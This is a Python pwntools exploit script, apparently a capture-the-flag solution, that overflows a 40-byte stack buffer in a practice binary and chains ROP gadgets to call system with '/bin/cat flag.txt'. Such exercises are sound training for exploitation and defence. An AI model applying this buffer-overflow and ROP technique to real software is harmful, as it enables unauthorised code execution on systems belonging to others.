#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    ### attack
    # 96 bytes are read, let's see what exactly
    # send(cyclic(96))
    success(cyclic_find('kaaa')) # this is an offset where we started overwriting the ret addr (40)
    garbage = p8(0x41) * 40

    rop = b""
    # ret; # to fix stack alignment
    rop += p64(0x000000000040053e)
    # pop rdi; ret;
    rop += p64(0x00000000004007c3)
    # 0x00601060 17  18   .data   ascii /bin/cat flag.txt
    rop += p64(0x00601060)
    rop += p64(elf.plt['system'])
    
    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
